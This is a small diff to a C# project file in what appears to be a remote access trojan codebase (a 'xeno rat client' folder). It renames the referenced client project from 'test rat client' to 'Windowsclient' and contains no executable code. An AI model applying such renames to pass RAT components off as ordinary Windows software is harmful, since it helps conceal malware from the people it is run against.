@@ -42,9 +42,9 @@
   <ItemGroup>
   </ItemGroup>
   <ItemGroup>
-    <ProjectReference Include="..\..\xeno rat client\test rat client.csproj">
+    <ProjectReference Include="..\..\xeno rat client\Windowsclient.csproj">
       <Project>{310fc5be-6f5e-479c-a246-6093a39296c0}</Project>
-      <Name>test rat client</Name>
+      <Name>Windowsclient</Name>
     </ProjectReference>
   </ItemGroup>
   <ItemGroup>
